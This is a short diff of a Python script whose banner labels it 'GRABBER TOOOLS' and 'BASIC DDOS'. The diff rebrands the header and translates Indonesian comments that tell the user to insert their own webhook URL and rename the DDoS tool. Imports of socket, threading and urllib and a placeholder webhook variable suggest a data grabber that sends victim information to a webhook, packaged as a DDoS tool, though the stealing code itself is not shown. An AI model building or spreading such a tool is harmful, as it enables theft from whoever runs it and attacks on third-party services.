@@ -1,5 +1,8 @@
-#TOOLS BY WIFA WP
-
+##########################################################################################                 
+###########            GRABBER TOOOLS                        GuhhSec#0001     ############
+######################################         BASIC DDOS              ###################
+##########################################################################################
+##########################################################################################
 import random
 import socket
 import threading
@@ -17,10 +20,11 @@ from urllib.request import Request, urlopen
 os.system("cls")
 print("\u001b[37m")
 
-#MASUKAN WEBHOOK KALIAN DI BAWAH
+               
+#Your Webhooks 
 webhook_url = "WebhookKalian"
-#DAN SCROLL KE PALING BAWAH UNTUK GANTI NAMA TOOLS DDOSNYA
-#JANGAN LUPA JANGAN DI APUS CODERNYA
+#Scroll Ke Bawah Buat Changed Tools
+
 
 languages = {
 	'da'    : 'Danish, Denmark',
